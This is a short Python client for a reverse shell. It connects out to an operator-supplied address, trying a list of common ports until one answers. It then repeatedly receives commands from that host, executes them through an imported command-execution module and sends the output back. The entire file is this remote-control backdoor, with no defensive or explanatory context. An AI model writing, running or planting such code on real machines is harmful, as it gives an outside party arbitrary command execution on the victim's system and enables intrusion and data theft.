import socket, threading, sys, time
import command_execution

class Client:
    def __init__(self, ip, port):
        self.mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server = (ip, port)
        self.ip = ip

    def connect_to_port(self):
        self.mysocket.connect(self.server)

    def connect_to_portlist(self):
        ports = [22, 80, 443, 445, 8000, 8080, 8989]
        connected = False
        while not connected:
            for port in ports:
                time.sleep(1)
                try:
                    print(f"Connecting to port {port}...")
                    self.mysocket.connect((self.ip, port))
                except Exception as e:
                    print("Connecting unsuccessful. Trying again..")
                    continue
                else:
                    print("Connected!")
                    connected = True
                    break

    def execute_command(self):
        self.connect_to_portlist()
        while True:
            command_to_run = self.mysocket.recv(10000).decode()
            if len(command_to_run) == 0:
                continue
            results = command_execution.run_command(command_to_run)
            self.mysocket.send(results)

def main():
    ip, port = sys.argv[1], int(sys.argv[2])
    client = Client(ip, port)
    #client.connect_to_portlist()
    client.execute_command()

if __name__ == '__main__':
    main()
